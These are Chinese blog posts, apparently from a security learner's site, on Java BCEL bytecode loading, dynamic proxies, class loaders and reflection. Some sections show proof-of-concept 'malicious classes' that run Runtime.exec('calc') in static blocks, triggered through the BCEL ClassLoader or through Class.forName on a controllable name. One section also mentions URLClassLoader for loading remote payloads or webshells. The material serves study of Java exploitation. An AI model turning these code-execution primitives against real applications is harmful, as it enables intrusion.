简单梳理一下过程，首先就是设置cl为null\n然后在下面这个条件语句判断开头有没有这个东西，如果有，就使用createClass()方法来对象并赋值给clazz，具体实现可以自己去看源代码（在createClass方法内就已经将BCEL形式的字节码转换成JavaClass对象了）\n此时clazz不为null，那么就会进入到下面这个语句\n这里就会调用到defeineClass()方法了，再在这里面得到类的Class字节码，最终获得类对象cl并return了回去。\n流程已经基本清楚，那么如何利用呢，如下：\n在BCEL中，它提供了Utility和Repository类\n其中Repository提供了lookupClass方法用于加载一个类\nUtility类提供了一个encode方法用于将JavaClass对象转换成BCEL形式的字节码\n1 String code = Utility.encode(clazz.getBytes(), true); 再用BCEL ClassLoader进行加载\n1 new ClassLoader().loadClass(\u0026#34;$$BCEL$$\u0026#34; + code).newInstance();//这里就是简单的实例化对象后的对一个函数的调用 整合一下，我们可以这样利用\n编写恶意类：\n1 2 3 4 5 6 //Test.java public class Test{ static { Runtime.getRuntime().exec(\u0026#34;calc\u0026#34;); } } POC：\n1 2 3 4 5 6 7 8 9 10 11 12 13 import com.sun.org.apache.bcel.internal.Repository; import com.sun.org.apache.bcel.internal.classfile.JavaClass; import com.sun.org.apache.bcel.internal.classfile.Utility; import com.sun.org.apache.bcel.internal.util.ClassLoader; public class Main { public static void main(String[] args) throws Exception { JavaClass clazz = Repository.lookupClass(Test.class); String code = Utility.encode(clazz.getBytes(), true); System.out.println(code); new ClassLoader().loadClass(\u0026#34;$$BCEL$$\u0026#34; + code).newInstance(); } } 成功弹出计算机：\n代码为什么要这样构造其实已经比较清楚了，可以自己想想流程来对比一下。\n还有的就是这里JDK7运行需要改idea的配置，为了能测试成功改了，但是后面又改回来了，刚好防止自己忘，可以参考文章来改：https://blog.csdn.net/weixin_46001244/article/details/108601584\n","date":"2025-01-22T13:00:13+08:00","permalink":"https://fupanc-w1n.github.io/p/%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/","title":"动态加载字节码"},{"content":"Java动态代理 利用了代理模式，一个通俗易懂的说法：给某一个对象提供一个代理，并由代理对象来控制对真实对象的访问。\n简单说明 代理模式是Java中常见的设计模式。\n其特征是代理类和委托类有同样的接口，代理类主要负责为委托类预处理消息、过滤消息、把信息转发给委托类，以及事后处理消息等。\n代理类与委托类之间通常会存在关联关系，一个代理类对象与一个委托类对象关联，代理类对象本身并不真正实现服务，而是通过委托类对象的相关方法来提供特定服务。\n静态代理 需要代理对象和目标对象实现同样的接口。\n**缺点：**当需要的代理的对象过多就需要实现大量的代理类，并且当接口增加方法，目标对象与代理对象都要进行修改\n直接用参考文章的一个demo来演示一下什么是静态代理，理解一下\nEvent.java:\n1 2 3 4 5 6 //接口类 package java_foundation; public interface Event { void sale(); } Text.java\n1 2 3 4 5 6 7 8 //委托类 package java_foundation; public class Text implements Event { public void sale(){ System.out.println(\u0026#34;要卖房子了\u0026#34;); } } MyTest.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 //代理类 package java_foundation; public class MyTest implements Event{ private Event instances; public MyTest(Event a){ this.instances = a; } public void sale(){ instances.sale(); System.out.println(\u0026#34;售价2000元\u0026#34;); } } 最终的测试类：Test.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 //测试类 package java_foundation; public class Main{ public static void main(String[] args) throws Exception{ System.out.println(\u0026#34;======使用代理前====\u0026#34;); Text a = new Text(); a.sale(); System.out.println(\u0026#34;======使用代理后====\u0026#34;); MyTest b = new MyTest(new Text()); b.sale(); } } 只要搞清楚对象的关系，这里的代码就不难理解了。最后结果如下：\n1 2 3 4 5 ======使用代理前==== 要卖房子了 ======使用代理后==== 要卖房子了 售价2000元 也就是可以将代理设想为这里卖房子的中介，中介来给你定义具体的内容，你只需要把大体的说明就行了。\n我们这里是用的接口类作为接收参数的类型，并且构造函数的接收的参数类型也都是接口类型。\n有一个点说明一下，这里为什么这里要使用Event接口类型作为媒介呢，应该是因为委托类实现了Event接口，这样就可以使得相应的Text()对象可以成为这个类型，同时代理类MyTest也接口了Event接口，所以MyTest类也可以接受Event类型的数据。\n这里最重要的实现代理的操作就是代理类中的如下代码：\n1 2 3 4 public void sale(){ instances.sale(); System.out.println(\u0026#34;售价2000元\u0026#34;); } 就是因为这串代码导致的最终输出为\n1 2 要卖房子了 售价2000元 因为我们new后将instance对应到了委托类的对象，此时就会调用Text.java中的sale()方法，所以其实一般代理类的重要代码都会调用两次。简单流程图如下\n动态代理 与静态代理相同，需要公共接口，委托类，代理类。区别就是动态代理是利用反射机制在运行时创建代理类。这里需要用到位于Java.lang.reflect下的Proxy类与InvocationHandler接口。\nInvocationHandler接口：负责提供调用代理的操作 1 2 3 4 public interface InvocationHandler { public Object invoke(Object proxy, Method method, Object[] args) throws Throwable; } 其中proxy为代理类的实例对象，method表示调用的方法名，args[]为调用方法的参数数组\n这个接口定义了一个invoke()方法，每个代理对象都有一个关联的接口。这个是很重要的：当代理对象上调用任意方法时，该方法会被自动转发到InvocationHandler.invoke()方法进行调用\nProxy类：负责动态构建代理类 位于java.lang.reflect.Proxy，提供了静态方法用于得到代理对象\n1 public static Object newProxyInstance(ClassLoader loader,Class\u0026lt;?\u0026gt;[] interfaces,InvocationHandler h)throws IllegalArgumentException{} 继续使用前面的那个例子，结合代码，我们这里需要获得类加载器，相对应的方法，直接给代码：\n委托类和接口不变，\nText.java:\n1 2 3 4 5 6 7 8 //委托类 package java_foundation; public class Text implements Event { public void sale(){ System.out.println(\u0026#34;要卖房子了\u0026#34;); } } Event.java：\n1 2 3 4 5 6 //接口类 package java_foundation; public interface Event { void sale(); } 看其他需要修改的代码：\nMyTest.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //动态获取代理的代理类 package java_foundation; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; public class MyTest implements InvocationHandler{ private Object instances; public MyTest(Object a){ this.instances = a; } //重写invoke()方法 public Object invoke(Object proxy, Method method, Object[] args) throws Throwable{ System.out.println(\u0026#34;售价2000元\u0026#34;); Object result = method.invoke(instances,args); return result; } } 在这个代理类重写的invoke()方法中，看到了很熟悉的操作，调用方法，对，就是调用了invoke()方法，结合在前面说明InvocationHandler接口类时，大概久能知道这里的调用逻辑。后面看了结果就知道了。\nMain.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //测试类 package java_foundation; import java.lang.reflect.Proxy; import java.lang.reflect.InvocationHandler; public class Main{ public static void main(String[] args) throws Exception{ //获取委托类的实例对象 Text text = new Text(); //获取CalssLoader ClassLoader classLoader = text.getClass().getClassLoader(); //获取所有接口 Class[] interfaces = text.getClass().getInterfaces(); //获取一个调用处理器 InvocationHandler invocatinoHandler = new MyTest(text); //创建代理对象 Event proxy = (Event)Proxy.newProxyInstance(classLoader,interfaces,invocatinoHandler); proxy.sale(); } } 成功输出\n1 2 售价2000元 要卖房子了 大概就是这这样，其实理解一下就行了，难度不是很高，重点关注invoke()中的代码。\n（参考文章有一道题，后面可以学习一下）\n参考文章：\nhttps://xz.aliyun.com/t/9197?time__1311=n4%2BxuDgD9DyDnB7QGQD%2FD0WoQ4D55i%3D31YNGt4D\nhttps://blog.csdn.net/DDDYSz/article/details/109451049\nhttps://tttang.com/archive/1769/\nhttps://www.cnblogs.com/whirly/p/10154887.html\n","date":"2025-01-22T12:57:32+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","title":"Java动态代理"},{"content":"Java类加载机制 JVM（java虚拟机）把描述类的数据从Class文件加载到内存，并对数据进行校验、解析和初始化，最终形成可以被虚拟机直接使用的Java类型，这就是虚拟机的类加载机制。\nJava类 Java是编译型语言，我们编写的java文件需要被编译成class文件后才能被JVM运行，这里先了解一下java类。\n给一个Main.java，内容如下：\n1 2 3 4 5 public class Main{ public static void main(String[] args){ System.out.println(\u0026#34;haha\u0026#34;); } } 使用javac命令将其编译为字节代码的class文件，结果如下：\n这样就生成了一个字节码文件 ，用十六进制工具打开看一下\n这里就可以看到生成的字节码，我们可以通过JDK自带的javap命令反汇编Main.class文件对应的Main类，\nJVM在执行Main之前会先解析class二进制内容，JVM执行的其实就是如上javap命令生成的字节码。\n类加载的时机 （具体可参考《深入理解Java虚拟机》一书）\n类加载过程如下表示：\n其中 从验证到解析 为连接， 从加载到初始化 为类加载\n加载 加载过程：\n通过类的全限定名（包名+类名）来获取定义此类的二进制字节流 将这个字节流所代表的静态存储结构转化为运行时的数据结果 在内存中生成一个代表这个类的java.lang.Class对象，作为方法区这个类的各种数据的访问入口 校验 这一阶段的目的是为了确保Class文件的字节流中包含的信息符合当前虚拟机的要求，并且不会危害虚拟机自身的安全。从整体上看，验证阶段大致上会完成4个阶段的校验工作：文件格式、元数据、字节码、符号引用。可以通过设置参数略过。\n准备 准备阶段是正式为类中定义的变量（即静态变量\u0026ndash;被static修饰的变量）分配内存并设置类变量初始值的阶段。\n这里需要注意的点：\n此时进行内存分配的仅包括类变量（静态变量），而不包括实例变量，实例变量将会在对象实例化时随着对象一起分配在Java堆中。 也就是说类变量随着类的加载为存在于方法区\n其次就是这里说的初始值“通常情况”下是数据类型的零值，比如如下代码： public satic int value = 123;，在准备阶段过后的初始值为0而不是123。把value赋值为123的指令在初始化阶段才会被执行。\n但是在一些特殊情况，如果类变量同时被static和final修饰，比如：\npublic static final int value = 123;\n那么在准备阶段虚拟机就会将value赋值为123，并且在定义这个变量的时候必须为其显式的赋值。\n解析 解析阶段是Java虚拟机将常量池内的符号引用替换为直接引用的过程\n符号引用就是一组符号来描述目标，可以是任何字面量。 直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。 初始化 执行类构造器\u0026lt;clinit\u0026gt;()方法的过程\n会调用java.lang.ClassLoader加载类字节码，ClassLoader会调用JVM的native方法（defineClass0/1/2）来定义一个java.lang.Class 实例\n其中包括：\n执行static语句块中的语句 完成static属性的赋值操作 当类的直接父类还没有被初始化，则先初始化其直接父类 ClassLoader类加载器分类 一切的Java类都必须经过JVM加载后才能运行，而ClassLoader的主要作用就是Java类文件的加载。\n类加载器类型包括四种，分别如下：\nBootstrap ClassLoader（启动类加载器）：最顶层的类加载器，主要加载核心类库。这个类加载器负责加载存放在 jre\\lib 目录下的部分jar包（如rt.jar、tools.jar）或者被-Xbootclasspath 参数所指定的路径中存放的类库。 Extension ClassLoader（扩展类加载器）：这个加载器由sun.misc.Launcher$ExtClassLoader实现，它负责加载 jre\\lib\\ext 目录中的，或者被 java.ext.dirs 系统变量所指定的路径中的所有类库 Application ClassLoader（系统类加载器）：这个类加载器由 sun.misc.Launcher$AppClassLoader 实现。它负责加载用户类路径（ClassPath）上所指定的类库。需要注意的是如果应用程序中没有自定义自己的类加载器，一般情况下AppClassLoader是默认的类加载器。 用户自定义加载器 在Java虚拟机角度来看，存在两种不同的类加载器：\n一种是启动类加载器，这个加载器使用C++语言实现，是虚拟机自身的一部分。所以当使用getClassLoader()方法时会返回null（后面会说）\n还有一种是其他所有的类加载器，这些类加载器都由Java语言实现，独立存在于虚拟机外部，并且全都继承自抽象类 java.lang.ClassLoader。\n获取类加载器的方法：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import java.lang.ClassLoader; public class Main { public static void main(String[] args) throws Exception { // 获取 Test 类的类加载器 ClassLoader testClassLoader = Class.forName(\u0026#34;Test\u0026#34;).getClassLoader(); System.out.println(\u0026#34;Test 类的类加载器: \u0026#34; + testClassLoader); // 获取当前类的类加载器 ClassLoader currentClassLoader = Main.class.getClassLoader(); System.out.println(\u0026#34;Main 类的类加载器: \u0026#34; + currentClassLoader); // 获取系统类加载器 ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader(); System.out.println(\u0026#34;系统类加载器: \u0026#34; + systemClassLoader); } } /* Output: Test 类的类加载器: sun.misc.Launcher$AppClassLoader@18b4aac2 Main 类的类加载器: sun.misc.Launcher$AppClassLoader@18b4aac2 系统类加载器: sun.misc.Launcher$AppClassLoader@18b4aac2 双亲委派模型 双亲委派模型要求除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器。注意这里的父子关系一般不是以继承关系实现，只是通过使用组合关系来复用父加载器的代码。\n双亲委派模型的工作流程图\n即如果一个类加载器收到了类加载的请求，它不会自己去尝试加载这个类，而是把这个请求委派给父类加载器去完成，每一层次的加载器都是如此，直到传送到最顶层的启动类加载器，只有当父加载器反馈自己无法完成这个加载请求的时候（即它的搜索范围中没有找到所需的类）时，子加载器才会尝试自己去完成加载。\n双亲委派模型的优点：\n1、这样就是能够实现有些类避免重复加载使用，直接先给父加载器加载，不用子加载器再次重复加载。\n2、保证java核心库的类型安全。比如网络上传输了一个java.lang.Object类，通过双亲模式传递到启动类当中，然后发现其Object类早已被加载过，所以就不会加载这个网络传输过来的java.lang.Object类，保证我们的java核心API库不被篡改，出现类似用户自定义java.lang.Object类的情况。\n双亲委派模型实现代码\n这段代码的逻辑就是先检查请求加载的类型是否被加载过，如果没有就调用父加载器的loadClass() 方法，若父加载器为空则默认使用启动类加载器为父加载器。假如父加载器加载失败，才调用自己的findClass()方法加载。\n最后通过上述步骤我们找到了对应的类，并且接收到的resolve参数的值为true,那么就会调用resolveClass(Class)方法来处理类。\n//类加载器核心方法 loadClass：加载指定的Java类\nfindClass：查找指定的Java类\nfindLoadedClass：查找JVM已经加载过的类\ndefineClass：定义一个Java类\nresolveClass：链接指定的Java类\n类加载的方式 命令行启动应用时由JVM初始化加载 通过Class.forName()方法动态加载 通过ClassLoader.loadClass()方法动态加载。 通过Class.forName方法动态加载会执行类中的static块，而ClassLoader.loadClass()方法动态加载不会执行\n在前面反射的学习中也是说明了可以利用classloader来加载类，在这里利用加载器获取Class对象的代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 package java_foundation; import java.lang.ClassLoader; import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception{ //加载类的Class对象： Class clazz = ClassLoader.getSystemClassLoader().loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); Method method = clazz.getDeclaredMethod(\u0026#34;getName\u0026#34;); System.out.println(\u0026#34;hello \u0026#34;+method.invoke(clazz.newInstance(),null)); } } //hello fupanc 可以看到可以正常获取到类的Class对象并且调用它。\n调试类加载过程 测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 package java_foundation; import java.lang.ClassLoader; public class Main { public static void main(String[] args) throws Exception{ ClassLoader classLoader = ClassLoader.getSystemClassLoader(); //加载类 Class clazz = classLoader.loadClass(\u0026#34;java_foundation.Reflection\u0026#34;); } } 打断点后调试：\n得到当前类加载器为系统类加载器，然后强制步入loadClass()方法，进入到了ClassLoader类的loadClass()方法。在这个laodClass()方法中会调用另外一个重载的loadClass()方法：\n简单注意一下这个参数传递，看看后面有没有用。继续跟进这个loadClass()方法,但是由于jdk自带的包中有些文件是反编译的.class文件，反编译的代码有一些不是很纯却，所以这里需要将其转换为.java文件，具体就看参考文章，这里不多说。\n然后继续调试，步入后发现到达了Launcher类的loadClass()方法：\n这样就可以看出来这里的调用逻辑，不多说，再往后面看，这里的ucp.knownToNotExist(name)为false，所以会直接调用到后面的代码，如下：\n这里的super是系统类加载器，也就是说这里调用了类加载器来加载类：\n现在就到了ClassLoader类的loadClass()方法： 这里的逻辑还是比较好看，首先这里的synchronized是Java提供的同步机制，用于保证多线程访问共享资源时的线程安全，而在getClassLoadingLock(name) 方法返回一个用于加载类的锁对象，所以这的目的就是为每个类的加载过程提供独立的锁，防止多个线程同时加载同一个类。\n然后现在来看方法内部的代码，首先就是看JVM中是否加载过这个类，这里为null，也就是没有加载过。然后进入了if语句：\n这里检测到了系统类加载器有父加载器Extension ClassLoader（扩展类加载器）。\n然后就调用类ExtClassLoader类加载器的loadClass()方法（同样是ClassLoader类的loadClass()方法）：\n但是这里的parent为null，也算符合预期，因为扩展类加载器本来就没有父加载器。\n然后就会进入else语句，其实这个findBootstrapClassOrNull()方法就是看怎么进行的，跟进这个方法：\n但是这个findBootstrapClass(name)执行后还是为Null，回退到loadClass()方法：\n后面就会进入这个if条件，然后调用扩展类加载器来调用findClass()方法来查找类：\n可以看到这个方法中有defineClass()方法，但是这里并没有进入这个条件，大概可以知道这里就是在调用扩展类加载器来查找，但是并没有找到，直接退出了。\n然后就退出到了前面AppClassLoader加载器的loadClass()方法：\n随后就会调用到AppClassLoader类加载器的findClass()方法：\n这里应该是因为异常退出导致c直接被设置为null。\n然后跟进这里的findClass()方法:\n可以看到最后返回这个result，这个result就是我们想要寻找的类。并且这里是在这个方法内部声明的result，所以这个找类的操作必然是中间的那个赋值操作完成的，调试一下，确实是调用的defineClass()方法来定义的类：\n最后是找到了这个了类:\n然后回到loadClass()方法，最后是直接返回了这个Reflection类：\n然后一直返回，成功得到了这个Refelction类的Class对象：\nOK。调试结束。大概过程梳理下来确实比较符合双亲委派机制，先是AppClassLoader，然后是ExtClassLoader，然后是启动类加载器，启动类加载器找不到然后再委派给子加载器加载，最后在系统类加载器找到想要加载的类。\n————\n现在我们来看一下sun.misc.Launcher类，并且在调试过程中都是进入了这个Launcher类的，简单看一下源码，可以发现这个类里面有常用的类加载器的源码，看下面这两个代码：\n1 2 3 static class AppClassLoader extends URLClassLoader{} static class ExtClassLoader extends URLClassLoader{} 看一下URLClassLoader\n1 public class URLClassLoader extends SecureClassLoader implements Closeable{} SecureClassLoader\n1 public class SecureClassLoader extends ClassLoader{} 从这些代码片段可以看出上面介绍的类加载器在使用时为什么不是继承关系，而是组合关系，叫作父加载器是为了更好学习。\n继承图如下：\nURLClassLoader URLClassLoader 继承了 ClassLoader，从名字就可以看出来，URLClassLoader 提供了加载远程资源的能力，在写漏洞利用的 payload 或者 webshell 的时候我们可以使用这个特性来加载远程的 jar 来实现远程的类方法调用。\n首先声明一点，对于class文件是否要有软件包声明问题，报错的话有两种解决方法：\nclass文件不要软件包 调用loadClass()方法加载时加上软件包即可，如 java_foundation.Reflection ——————\nMyTest.java：\n1 2 3 4 5 public class MyTest { public MyTest(){ System.out.println(\u0026#34;调用了无参构造函数\u0026#34;); } } javac编译生成MyTest.class文件，再将其放在E盘。然后将当前项目中的所有MyTest.java文件删除，同时注意classpath中已编译的MyTest.class文件，也要删除，然后使用如下代码测试：\nMain.java文件：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ File filePath = new File(\u0026#34;E:\\\\\u0026#34;); URL url = filePath.toURI().toURL(); System.out.println(filePath.toURI()); System.out.println(filePath.toURI().toURL()); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url}); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTest类加载器为\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTest类的父加载器为\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } 输出结果：\n1 2 3 4 5 file:/E:/ file:/E:/ MyTest类加载器为java.net.URLClassLoader@7a81197d MyTest类的父加载器为sun.misc.Launcher$AppClassLoader@14dad5dc 调用了无参构造函数 可以看到这里调用的是URLClassLoader构造器，并且这个构造器的父加载器是AppClassLoader加载器。了大概说一下这里的逻辑，先用File类来定义了一个在D盘下搜索文件的File对象。\n然后调用了toURI().toURL()函数来将File对象转换为URL，因为URL是URLClassLoader用来定位资源的格式。这里创建了一个URL类型的数组，是URLClassLoader类的构造函数决定的：\n然后就是加载类那些了，不多说。\n但是如果classpath中有相关远程加载类的编译代码，此时AppClassLoader就会优先加载这个本地class文件，而不会去加载E盘的文件，如下尝试;\n另外的MyTest.java文件内容：\n1 2 3 4 5 public class MyTest { public MyTest(){ System.out.println(\u0026#34;调用了classPath中的MyTest文件\u0026#34;); } } 然后我将其打成jar包加入到当前maven项目的外部库中，也就是引入了classpath中，再使用之前的代码里来测试，输出如下：\n1 2 3 4 5 file:/E:/ file:/E:/ MyTest类加载器为sun.misc.Launcher$AppClassLoader@14dad5dc MyTest类的父加载器为sun.misc.Launcher$ExtClassLoader@2f92e0f4 调用了classPath中的MyTest文件 可以看到确实是优先调用的classpath中的文件，并且不再调用URL中引入的文件。\n但是这里同样是有解决方法的，我们可以将URLClassLoader的父类设置为启动类加载器，这样在双亲委派时就可以避免AppClassLoader加载classpath中的文件，而是URLClassLoader优先加载。\n测试代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ File filePath = new File(\u0026#34;E:\\\\\u0026#34;); URL url = filePath.toURI().toURL(); System.out.println(filePath.toURI()); System.out.println(filePath.toURI().toURL()); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTest类加载器为\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTest类的父加载器为\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } 执行结果为：\n1 2 3 4 5 file:/E:/ file:/E:/ MyTest类加载器为java.net.URLClassLoader@24d46ca6 MyTest类的父加载器为null 调用了无参构造函数 可以看到这里成功外部加载了其他的class文件。这里调用的构造函数为：\n可以看出来第二个参数就是指定父类的操作，在前面的学习后，这里将其设置为null就是将其设置为启动类加载器的子加载器，很好理解，然后个人理解这里调用URLClassLoader就是用来“动态构造”一个ClassLoader，大概就是这样。\n同样的，还可以直接将其设置为一个URL对象，如下代码：\nMain.java：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ URL url = new URL(\u0026#34;file:/E:/\u0026#34;); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTest类加载器为\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTest类的父加载器为\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } 输出结果为：\n1 2 3 MyTest类加载器为java.net.URLClassLoader@24d46ca6 MyTest类的父加载器为null 调用了无参构造函数 本地加载成功，网络传输class文件是差不多的，在这里对于传参类型看源码很容易看出来，这里不多说。\n但是有一个点是要说明的，如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.io.File; import java.net.URL; import java.net.URLClassLoader; public class Main { public static void main(String[] args) throws Exception{ URL url = new URL(\u0026#34;file:/D:/\u0026#34;); URLClassLoader urlClassLoader = new URLClassLoader(new URL[]{url},null); Class clazz = urlClassLoader.loadClass(\u0026#34;MyTest\u0026#34;); System.out.println(\u0026#34;MyTest类加载器为\u0026#34;+clazz.getClassLoader()); System.out.println(\u0026#34;MyTest类的父加载器为\u0026#34;+clazz.getClassLoader().getParent()); clazz.newInstance(); } } 没有输出，而是报错：\n1 2 3 4 5 Exception in thread \u0026#34;main\u0026#34; java.lang.ClassNotFoundException: MyTest at java.net.URLClassLoader.findClass(URLClassLoader.java:381) at java.lang.ClassLoader.loadClass(ClassLoader.java:424) at java.lang.ClassLoader.loadClass(ClassLoader.java:357) at java_foundation.Main.main(Main.java:11) 想了一下，这是因为”新定义“的URLClassLoader只是启动类的子加载器，但是它没有子加载器，这里D盘下并没有MyTest.class文件，虽然classpath中有，但是没有子类，所以是无法调用成功的，可以和前面父类的AppclassLoader的代码对比理解一下。\n——————————\n参考文章：\nhttps://xz.aliyun.com/t/12669?time__1311=GqGxuDRiD%3Dit%3DGN4eeqBKqAKKhQQdFD9WoD\nhttps://blog.csdn.net/yrk0556/article/details/105348968\nhttps://blog.csdn.net/qq_37205350/article/details/108805628\nhttps://blog.csdn.net/briblue/article/details/54973413\nhttps://blog.csdn.net/TJtulong/article/details/89598598\nhttps://blog.csdn.net/m0_45406092/article/details/108984101\nhttps://nivi4.notion.site/Java-cedccc0611654bd99f841de3ef578e24\n","date":"2025-01-22T12:54:28+08:00","permalink":"https://fupanc-w1n.github.io/p/java%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/","title":"Java类加载机制"},{"content":"Java反射机制 Java反射（Reflection）是Java非常重要的动态特性**，通过使用反射我们可以获取到任何类的成员方法（Methods）、成员变量（Fields）、构造方法（Constructors）等信息，还可以动态创建Java实例、调用任意的类方法、修改任意的类成员变量值等**。\n这是一个重要的机制，可以绕过java私有访问权限检查，反射获取并调用私有的类从而可以进行命令执行\n本地JDK测试版本：\nJDK 8u71 最好是搭建一个maven项目来学习，这样更好添加依赖。\n反射机制流程 当我们创建了一个类文件，经过javac编译之后，就会形成.class文件，同时JVM内存会查找生成的.class文件读入内存和经过ClassLoader加载，同时会自动创建生成一个Class对象，里面拥有其获取的成员变量，成员方法，和构造方法等。\nJVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息。获取了某个Class实例，就可以通过这个Class实例获取到该实例对应的class的所有信息\n反射常用的包和类 反射机制相关操作一般位于 java.lang.reflect 包中\n需要注意的类：\n1 2 3 4 java.lang.Class：类对象 java.lang.reflect.Constructor：类的构造器对象 java.lang.reflect.Field：类的属性对象 java.lang.reflect.Method：类的方法对象 反射常见使用的方法 获取类的方法：forName\n实例化类对象的方法：newInstance\n获取函数的方法：getMethod\n执行函数的方法：invoke\n我们可以使用这些方法来获得其他类的各种属性和方法\n获取class对象 forName不是获取“类”的唯一途径，通常来说还有下面三种利用java.lang.Class对象的方式来获取一个“类”\n获取Class对象的三种方式：\nClass.forName(\u0026ldquo;全类名\u0026rdquo;) ：将字节码文件加载进内存，返回Class对象 多用于配置文件，将类名定义在配置文件中。读取文件，加载类。\n类名.class ：通过类名的属性class获取 多用于参数的传递\n对象.getClass() ：getClass()方法定义于Object类中,并且需要先实例化一个对象。这里有一个点要说明。如果不是一个实例化对象，而是一个class对象，那么都会返回class java.lang.Class，同样的，如果是一个方法的class对象，那么返回的会是class java.lang.reflect.Method，注意区分辨别。 classloader.loadClass()：这是通过类加载器来加载类，这个板块不说，后面到类加载器再了解。 多用于对象的获取字节码的方式\n\u0026mdash;-————\n给一个代码来演示一下获取Class对象的三种方式：\n目录结构为：\ndemo：Reflection.java 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 package java_foundation; public class Reflection { private String name; protected String sex; public int age = 222; public int getAge(){ return this.age; } public void setName(String name){ this.name=name; } public String getName(){ return this.name; } } 执行代码效果：Main.java： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ //方法一： Class clazz = Class.forName(\u0026#34;java_foundation.Reflection\u0026#34;); Reflection reflection = (Reflection)clazz.newInstance();//实例化对象 reflection.setName(\u0026#34;fupanc\u0026#34;); System.out.println(reflection.getName()); //方法二 Class clazz1 = Reflection.class; Reflection reflection1 = (Reflection)clazz1.newInstance(); reflection1.setName(\u0026#34;fupanc1\u0026#34;); System.out.println(reflection1.getName()); //方法三 Reflection reflection2 = new Reflection(); Class clazz2 = reflection2.getClass(); Reflection reflection3 = (Reflection)clazz2.newInstance(); System.out.println(reflection3.getAge()); //其他说明 Class reflection5 = Reflection.class; System.out.println(reflection5.getClass()); System.out.println(reflection5.getName()); } } 输出为：\n1 2 3 4 5 fupanc fupanc1 222 class java.lang.Class java_foundation.Reflection 可以清楚明白地看出这里的差别，重要的是，学习java一定要有对象的概念。\n需要注意的是，在获取class对象中，一般使用Class.forName方法去获取，其他两个都有一定的限制。\n另外的一个点需要说明\nforName有两个函数重载：\nClass\u0026lt;?\u0026gt; forName(String name)\nClass\u0026lt;?\u0026gt; forName(String name, **boolean** initialize, ClassLoader loader)\n第⼀个就是我们最常⻅的获取class的⽅式，其实可以理解为第⼆种⽅式的⼀个封装：\n1 2 3 Class.forName(className) // 等于 Class.forName(className, true, currentLoader) 默认情况下， forName 的第⼀个参数是类名；第⼆个参数表示是否初始化；第三个参数就是 ClassLoader 。\n对于第二个参数，可以将其理解为对一个类的初始化，构造函数并不会执行，看如下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ Class clazz = Class.forName(\u0026#34;java_foundation.Test\u0026#34;); } } class Test{ { System.out.println(\u0026#34;直接调用的{}\u0026#34;); } static{ System.out.println(\u0026#34;直接调用的static\u0026#34;); } public Test(){ System.out.println(\u0026#34;调用了类的构造函数\u0026#34;); } } 输出结果为：\n1 直接调用的static 这样就可以很容易地看出“类的初始化\u0026quot;调用的是static {}，然后当我尝试Test test = new Test();这样显式地初始化时，可以发现调用顺序是：static{} ==》{} ==》构造函数。\n可以延伸一下，假设我们有如下函数，其中函数的参数name可控：\n1 2 3 4 5 6 7 8 9 10 package java_foundation; import java.lang.Class; public class Main { public static void main(String[] args) throws Exception{ String name =\u0026#34;java_foundation.MyTest\u0026#34;; Class clazz = Class.forName(name); } } 我们就可以编写⼀个恶意类，将恶意代码放置在 static {} 中，从⽽执⾏：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 package java_foundation; import java.lang.Runtime; import java.lang.Process; public class MyTest { static{ try{ Runtime runtime = Runtime.getRuntime(); String[] commands = {\u0026#34;calc\u0026#34;}; Process pc = runtime.exec(commands); pc.waitFor(); }catch(Exception e){ } } } 这样是可以成功弹计算机的，当然调用不一定是在main主方法中，还可以是其他方法内部调用。\n获取成员变量Field 